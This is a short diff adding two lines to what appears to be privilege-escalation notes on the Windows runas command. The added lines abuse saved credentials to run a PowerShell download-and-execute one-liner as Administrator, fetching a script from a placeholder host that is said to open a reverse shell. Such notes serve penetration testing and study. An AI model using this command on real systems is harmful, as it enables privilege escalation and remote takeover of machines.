@@ -227,4 +227,6 @@ https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
 # Runas command
 ```
 This command allows us to run commands as somebody else.
+We can use this command only if we have stored keys on cmdkey /list command.
+example runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.webclient).downloadstring('http://IP/FILENAME.ps1')" (the file will have a reverse shell/ other things that we want to abuse).
 ```
